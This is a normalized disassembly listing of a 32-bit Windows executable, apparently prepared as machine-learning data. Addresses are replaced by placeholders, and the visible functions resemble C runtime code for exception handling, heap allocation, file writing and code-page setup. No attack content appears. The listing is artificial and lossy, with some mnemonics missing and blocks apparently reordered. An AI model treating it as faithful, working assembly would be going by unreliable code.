pop edi
pop esi
pop ebx
leave
retn
sub_4087f1
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x20 ]
mov [ rw-data ] eax
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] ebx
jne r-xdata
cmp [ ebp - 0x2c ] ebx
je r-xdata
call sub_40721e
push eax
push edi
call sub_408a25
pop ecx
pop ecx
sub_408837
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_408861
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_40bbf8
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_40bbf8
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_408b52
push 0x1
push edi
call sub_40bc14
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40bbf8
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40bbf8
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40bc14
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_40bc14
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40bc14
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_407270
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_40bc30
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_408a8c
pop ecx
pop ecx
push eax
push edi
call sub_407270
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_408a8c
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_406ec3
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_408a8c
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_406eca
jmp r-xdata
push eax
call sub_408a8c
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_408a25
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_406ec3
or [ ebp - 0x4 ] 0xffffffff
sub_408a8c
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_408ab0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_407241
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_407241
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_408afc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
push 0xa
call sub_40ad89
push 0x16
call sub_40cf02
pop ecx
pop ecx
push 0x3
call sub_408d7a
and [ ebp - 0x4 ] 0x0
sub_408b52
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_408afc
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_408bba
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_408be6
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_40bc5f
test eax eax
pop ecx
jne r-xdata
sub_408be6
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
test esi esi
jne r-xdata
push esi
call sub_40b270
test eax eax
pop ecx
jne r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
pop esi
retn
sub_408c1c
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
test ebx ebx
push edi
jne r-xdata
mov esi [ esp + 0x18 ]
test esi esi
jne r-xdata
push [ esp + 0x18 ]
call sub_408ba8
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
call sub_407d6e
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call sub_40af1a
mov ebp eax
pop ecx
test ebp ebp
je r-xdata
mov eax edi
push esi
call sub_40bc5f
test eax eax
pop ecx
jne r-xdata
test esi esi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push ebp
call sub_40b725
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_40b270
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_407f80
push ebx
push ebp
call sub_40af45
add esp 0x14
jmp r-xdata
mov eax esi
push eax
push ebx
push edi
call sub_407f80
push ebx
push ebp
call sub_40af45
add esp 0x14
mov eax esi
test edi edi
jne r-xdata
sub_408d8b
push edi
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_408e24
pop ecx
pop ecx
test ebx ebx
pop ebx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
retn
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
push rw-data
push rw-data
call sub_408e24
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_408e3e
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_40af1a
test eax eax
pop ecx
je r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop esi
retn
mov eax [ esi - 0x4 ]
pop esi
sub eax 0x9
retn
sub_408e67
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax edi
mov esi edi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push edi
call sub_40be00
cmp eax 0xffffffff
pop ecx
je r-xdata
xor ebp ebp
cmp edi 0x1
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call sub_4094fc
pop ecx
jmp r-xdata
push 0x2
call sub_40be00
push 0x1
mov ebp eax
call sub_40be00
pop ecx
cmp eax ebp
pop ecx
je r-xdata
cmp edi 0x2
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_40be00
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ebp eax
jmp r-xdata
push edi
call sub_40bd86
mov eax [ ebx ]
pop ecx
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
je r-xdata
sub_408f1a
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_407d6e
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_408f45
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_408f80
test eax eax
pop ecx
je r-xdata
push esi
call sub_408fe5
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_40be3d
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_408f80
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_409167
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_408fe5
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rw-data ] esi
jle r-xdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_408f45
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_408f45
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_409052
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_409167
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_40bf72
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_409167
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_40bf2e
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_40be94
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_409167
push ebp
mov ebp esp
sub esp 0x414
mov ecx [ ebp + 0x8 ]
push ebx
cmp ecx [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
mov al [ eax + esi + 0x4 ]
test al 0x1
je r-xdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
test al 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push ecx
call sub_40be94
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
mov [ rw-data ] 0x1c
mov [ rw-data ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_4094fc
pop ecx
jmp r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] eax
jmp r-xdata
sub_409314
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_40bf98
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_409484
mov edx [ rw-data ]
push ebx
push ebp
push esi
xor ebp ebp
xor esi esi
xor eax eax
cmp edx ebp
push edi
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ rw-data ]
mov edi ebx
mov edi eax
push 0x20
shl edi 0x2
call sub_408ba8
pop ecx
mov ecx [ rw-data ]
mov [ edi + ecx ] eax
mov eax [ rw-data ]
mov edi [ edi + eax ]
cmp edi ebp
je r-xdata
test [ ecx + 0xc ] 0x83
je r-xdata
mov esi edi
mov esi [ ebx + eax * 4 ]
jmp r-xdata
inc eax
add edi 0x4
cmp eax edx
jl r-xdata
or [ esi + 0x10 ] 0xffffffff
mov [ esi + 0x4 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
mov [ esi + 0x1c ] ebp
cmp esi ebp
je r-xdata
mov ecx [ edi ]
cmp ecx ebp
je r-xdata
jmp r-xdata
sub_4094fc
mov ecx [ esp + 0x4 ]
xor edx edx
mov [ rw-data ] ecx
mov eax rw-data
mov eax [ edx * 8 + rw-data ]
mov [ rw-data ] eax
retn
add eax 0x8
inc edx
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
mov [ rw-data ] 0x16
cmp ecx 0xca
mov [ rw-data ] 0x8
jbe r-xdata
mov [ rw-data ] 0xd
retn
retn
sub_409563
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_40c251
add esp 0x1c
test eax eax
jne r-xdata
sub_4095e0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_409614
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_4097ad
mov esi eax
pop ecx
cmp esi [ rw-data ]
mov [ ebp + 0x8 ] esi
je r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40982a
xor edx edx
mov eax rw-data
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
lea esi [ edx + edx * 2 ]
mov [ ebp - 0x4 ] ebx
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] esi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_4097f7
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x40
xor eax eax
pop ecx
mov edi rw-data
cmp [ ebp - 0x18 ] 0x1
mov [ rw-data ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_409853
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or eax 0xffffffff
mov [ rw-data ] ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push esi
call sub_4097f7
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] 0x1
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_4097ad
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_4097f7
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40982a
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_409853
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_40c251
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_40c39a
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_40c39a
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
